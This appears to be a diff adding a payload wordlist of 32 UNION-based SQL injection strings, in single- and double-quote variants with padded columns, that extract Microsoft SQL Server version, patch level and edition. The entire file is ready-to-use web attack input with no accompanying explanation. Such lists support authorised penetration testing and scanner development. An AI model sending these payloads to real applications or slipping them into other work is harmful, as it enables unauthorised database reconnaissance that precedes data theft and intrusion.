@@ -1,0 +1,32 @@
+' UNION SELECT @@VERSION -- -
+' UNION SELECT SERVERPROPERTY('ProductVersion') -- -
+' UNION SELECT SERVERPROPERTY('ProductLevel') -- -
+' UNION SELECT SERVERPROPERTY('Edition') -- -
+' UNION SELECT @@VERSION, NULL -- -
+' UNION SELECT SERVERPROPERTY('ProductVersion'), NULL -- -
+' UNION SELECT SERVERPROPERTY('ProductLevel'), NULL -- -
+' UNION SELECT SERVERPROPERTY('Edition'), NULL -- -
+' UNION SELECT @@VERSION, 'test' -- -
+' UNION SELECT SERVERPROPERTY('ProductVersion'), 'test' -- -
+' UNION SELECT SERVERPROPERTY('ProductLevel'), 'test' -- -
+' UNION SELECT SERVERPROPERTY('Edition'), 'test' -- -
+' UNION SELECT @@VERSION, 'value', 'test' -- -
+' UNION SELECT SERVERPROPERTY('ProductVersion'), 'value', 'test' -- -
+' UNION SELECT SERVERPROPERTY('ProductLevel'), 'value', 'test' -- -
+' UNION SELECT SERVERPROPERTY('Edition'), 'value', 'test' -- -
+" UNION SELECT @@VERSION -- -
+" UNION SELECT SERVERPROPERTY('ProductVersion') -- -
+" UNION SELECT SERVERPROPERTY('ProductLevel') -- -
+" UNION SELECT SERVERPROPERTY('Edition') -- -
+" UNION SELECT @@VERSION, NULL -- -
+" UNION SELECT SERVERPROPERTY('ProductVersion'), NULL -- -
+" UNION SELECT SERVERPROPERTY('ProductLevel'), NULL -- -
+" UNION SELECT SERVERPROPERTY('Edition'), NULL -- -
+" UNION SELECT @@VERSION, 'test' -- -
+" UNION SELECT SERVERPROPERTY('ProductVersion'), 'test' -- -
+" UNION SELECT SERVERPROPERTY('ProductLevel'), 'test' -- -
+" UNION SELECT SERVERPROPERTY('Edition'), 'test' -- -
+" UNION SELECT @@VERSION, 'value', 'test' -- -
+" UNION SELECT SERVERPROPERTY('ProductVersion'), 'value', 'test' -- -
+" UNION SELECT SERVERPROPERTY('ProductLevel'), 'value', 'test' -- -
+" UNION SELECT SERVERPROPERTY('Edition'), 'value', 'test' -- -
